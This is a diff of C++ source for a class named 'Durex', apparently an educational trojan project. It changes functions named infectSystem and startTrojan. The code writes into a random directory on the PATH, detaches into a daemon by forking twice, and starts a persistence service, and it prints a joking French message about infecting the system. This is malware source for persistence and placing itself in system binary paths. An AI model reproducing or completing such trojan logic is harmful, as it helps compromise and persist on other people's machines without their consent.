@@ -61,9 +61,7 @@ void Durex::infectSystem()
 	Variable	*var				= this->env->getVariable("PATH");
 	int			random				= 0;
 	if (var != NULL && var->getVarValue().length() > 0) {
-		std::vector<std::string> content;
-		char *value = (char*)var->getVarValue().c_str();
-		boost::split(content, value, boost::is_any_of(":"));
+		std::vector<std::string> content = Utils::split(var->getVarValue(), ':');
 		if (content.size() > 0) {
 			random = this->getRandom(0, (content.size() - 1));
 			std::fstream file;
@@ -88,10 +86,20 @@ void Durex::startTrojan()
 		if (sid > 0) {
 			pid_t new_pid = fork();
 			if (new_pid == 0) {
-				std::cout << "slt vasi tinfect le system stp" << std::endl;
+				Service service(this->getCurrentPath());
+				service.initService();
+				std::cout << "slt vasi tinfect le system stp (" << this->getCurrentPath() << ")" << std::endl;
 				while (true);
+			} else if (new_pid > 0) {
+				exit(0);
 			}
+		} else {
+			//throw DaemonCantDetachProcess();
 		}
+	} else if (pid < 0) {
+		//throw DaemonForkFailed();
+	} else {
+		exit (0);
 	}
 }
 
@@ -111,9 +119,7 @@ bool Durex::isInSystemBinaryPath()
 	std::string	executablePath		= this->getCurrentPath();
 	if (var != NULL && var->getVarValue().length() > 0
 		&& executablePath.length() > 0) {
-		std::vector<std::string> content;
-		char *value = (char*)var->getVarValue().c_str();
-		boost::split(content, value, boost::is_any_of(":"));
+		std::vector<std::string> content = Utils::split(var->getVarValue(), ':');
 		for (int i = 0; i < content.size(); i++)
 		{
 			if (strstr(executablePath.c_str(), content[i].c_str())) {
